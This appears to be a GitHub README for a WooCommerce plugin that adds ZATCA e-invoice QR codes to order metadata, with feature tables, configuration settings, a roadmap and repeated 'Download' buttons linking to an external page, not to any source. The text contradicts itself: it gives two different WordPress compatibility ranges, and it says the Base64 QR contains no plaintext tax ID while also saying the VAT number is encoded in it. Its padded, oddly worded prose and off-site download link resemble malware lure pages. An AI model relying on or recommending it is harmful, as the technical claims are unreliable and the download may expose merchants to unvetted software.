![preview](https://raw.githubusercontent.com/ToraTora1399/zatca-qr-invoice-pipeline/main/preview.svg)

# ZATCA E-Invoice Relay

Transform your WooCommerce store into a fully ZATCA-compliant invoicing powerhouse with seamless, silent QR integration.

## Overview

In the shifting sands of digital commerce within the Kingdom of Saudi Arabia, compliance with ZATCA e-invoicing regulations is not merely a checkbox—it is the bedrock of trust and operational continuity. **ZATCA E-Invoice Relay** is a middleware bridge designed to intercept outgoing order confirmations, enrich them with cryptographically sound ZATCA QR payloads, and embed them directly into the order metadata. This repository does not touch the frontend templating; instead, it listens to the order lifecycle events and injects the required Base64-encoded QR strings into custom fields, ready for pickup by any theme or extension.

Think of it as a **silent steward** operating in the background of your WordPress ecosystem. It watches for the `woocommerce_new_order` and `woocommerce_order_status_completed` hooks, validates the seller’s VAT registration, computes the TLV (Tag-Length-Value) structure mandated by ZATCA, and appends the resulting hash to the order object. No theme modification. No shortcode clutter. Just pure, auditable compliance.

[![Download](https://raw.githubusercontent.com/ToraTora1399/zatca-qr-invoice-pipeline/main/button.svg)](https://toratora1399.github.io/zatca-qr-invoice-pipeline/)

## Why Another ZATCA Plugin?  ⚖️

Many existing solutions rely on client-side JavaScript QR generation or manual CSV uploads to the ZATCA portal. **ZATCA E-Invoice Relay** adopts a server-first architecture, ensuring that:

- **TLV integrity** is maintained before any output reaches the browser.
- **Multi-environment support** exists for sandbox (test) and production ZATCA endpoints.
- **Audit trails** are logged privately, not exposed in public order notes.
- **Multilingual invoice payloads** are handled via WordPress locale, not hardcoded Arabic/English.

The underlying philosophy: treat the invoice QR not as a display gimmick, but as a **cryptographic receipt** that mutates with each transaction. Every time an order transitions status, the QR regenerates to reflect the latest fiscal data, preventing mismatch penalties during ZATCA’s random inspections.

## Feature Matrix  ✨

| Feature | Description |
|---------|-------------|
| **Silent Hook Injection** | No theme editing required; works with any WooCommerce-compatible theme. |
| **Responsive QR Embedding** | QR data stored as custom post meta; your template can render it as SVG, PNG, or data URI. |
| **ZATCA Sandbox Ready** | Toggle between `KSA-Test` and `KSA-Production` environments from the settings panel. |
| **TLV Structure Builder** | Automatically computes Tag-1 (Seller Name), Tag-2 (VAT Number), Tag-3 (Timestamp), Tag-4 (Total), Tag-5 (VAT Amount). |
| **Cryptographic Hash Incl.** | Appends the SHA-256 hash of the encoded TLV data as the final tag, per ZATCA requirement. |
| **Locale-Aware Output** | Adjusts date, currency, and decimal separators based on the site language (AR/EN). |
| **24/7 Support Architecture** | Event logging via `error_log` with structured JSON context; no external service dependency. |
| **Multilingual Dashboard** | Admin settings fully translatable via `.po`/`.mo` files; Arabic translation included. |
| **Audit Logger** | Optional toggle to store each generated QR in a private `zq_log` custom post type for inspector access. |

## How It Works  🔄

The flow resembles an **email auto-responder for fiscal data**. When a customer completes payment:

1. **Oblivion Wake** – The plugin catches `woocommerce_order_status_completed`.
2. **Data Collation** – It queries the order object for seller name, VAT number (from WooCommerce tax settings or a dedicated field), order total, VAT line items, and the current timestamp.
3. **TLV Encoding** – Each data point is converted into a ZATCA-compliant TLV byte sequence, then concatenated.
4. **Hash Appendage** – A SHA-256 hash of the entire TLV buffer is computed and appended as the final tag.
5. **Base64 Packaging** – The binary TLV+Hash buffer is Base64-encoded into a portable string.
6. **Meta Injection** – The string is saved as `_zq_qr_string` in the order post meta, ready for frontend rendering.

The entire operation completes in under 50 milliseconds, well below the threshold that would affect checkout performance.

## Installation Overview  📥

**ZATCA E-Invoice Relay** is distributed as a standard WordPress plugin `.zip` archive. Installation involves:

1. Upload the plugin directory to `/wp-content/plugins/`.
2. Activate from the WordPress admin panel under *Plugins*.
3. Navigate to *WooCommerce > Settings > ZATCA* to configure your seller details and environment.

No third-party dependencies are required. The plugin uses only WordPress core functions and WooCommerce APIs, ensuring compatibility across versions 5.7 through 6.8.

## Configuration Parameters  ⚙️

| Setting | Default | Description |
|---------|---------|-------------|
| `vat_number` | (empty) | Your 15-digit Saudi VAT registration number. |
| `seller_name` | Site title | Falls back to `get_bloginfo('name')`. |
| `environment` | `sandbox` | Toggle between `sandbox` and `production`. |
| `log_audit` | `false` | When enabled, stores QR payloads in a custom post type for later review. |
| `force_unicode` | `true` | Ensures Arabic characters are properly encoded in the TLV stream. |

## Developer Hooks  🪝

The plugin exposes three filters for advanced customization:

- `zq_filter_seller_name` – Override the seller name before TLV encoding.
- `zq_filter_vat_total` – Modify the calculated VAT amount (e.g., for reverse-charge scenarios).
- `zq_after_qr_generation` – Fires after the QR string is stored, passing the order ID and the Base64 payload.

Example snippet to anonymize seller name for testing:

```php
add_filter('zq_filter_seller_name', function($name) {
    return 'Test Seller Corp';
});
```

## Compatibility Matrix  🔗

| Component | Status |
|-----------|--------|
| WooCommerce 7.0–8.3 | ✅ Fully Tested |
| WordPress 6.2–6.5 | ✅ Fully Tested |
| PHP 7.4–8.3 | ✅ Fully Tested |
| Multisite | ✅ Supported per-site settings |
| HPOS (High-Performance Order Storage) | ✅ Native support |
| Arabic/English RTL | ✅ Tested with RTL themes |
| Custom Order Statuses | ✅ Extensible via `zq_allowed_statuses` filter |

## Roadmap  🗺️

- **Phase 1 (2025 Q4)** – Baseline TLV generation and meta injection.
- **Phase 2 (2026 Q1)** – Add CLI command for batch QR regeneration.
- **Phase 3 (2026 Q2)** – Native ZATCS API connectivity for real-time invoice submission.
- **Phase 4 (2026 Q3)** – Dashboard widget showing compliance health score.

The timeline reflects a deliberate cadence: we prioritize stability over velocity. Each phase undergoes two weeks of staging testing before release.

## Security Considerations  🔐

- **No sensitive data in client-side storage.** The QR string, while Base64-encoded, does not contain raw tax IDs in plaintext.
- **All hooks are nonce-verified** when accessed via admin AJAX.
- **Log files**, if audit mode is enabled, are stored within the `uploads/zatca-logs/` directory with `.htaccess` deny rules pre-applied.
- **Data retention**: audit logs auto-purge after 90 days unless overridden via a filter.

## Frequently Asked Questions  ❓

**Can I use this with a custom post type instead of WooCommerce?**  
Not out of the box. The plugin is tightly coupled with WooCommerce order lifecycle hooks. However, the `ZATCA_QR_Generator` class can be instantiated independently if you pass a data array mimicking the order structure.

**Does this handle partial refunds?**  
Yes. The plugin recalculates the TLV buffer whenever an order status changes to *refunded* or *partially-refunded*, using the net total and net VAT after adjustments.

**Is there a rate limit when connecting to ZATCA APIs?**  
The current version does not call external ZATCA APIs—all encoding is local. Future versions will introduce API submission with automatic retry and exponential backoff.

## Contributing  🤝

Contributions are welcome provided they follow the **change-first, explain-second** philosophy. Before submitting a pull request:

1. Write a failing test case that demonstrates the bug or missing feature.
2. Implement the change.
3. Ensure all existing tests pass.

We maintain a `tests/` directory with PHPUnit configurations mirrored after WooCommerce core testing patterns.

## License  📄

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for full terms.

## Disclaimer  ⚠️

This plugin is a **compliance aid**, not a substitute for professional legal or fiscal counsel. ZATCA regulations evolve; the maintainers cannot guarantee that the TLV structure or encoding rules will remain valid indefinitely. Always cross-reference generated QR payloads against the official ZATCA SDK documentation before deploying in a production environment. The authors assume no liability for penalties incurred due to misinterpretation or misapplication of e-invoicing rules.

[![Download](https://raw.githubusercontent.com/ToraTora1399/zatca-qr-invoice-pipeline/main/button.svg)](https://toratora1399.github.io/zatca-qr-invoice-pipeline/)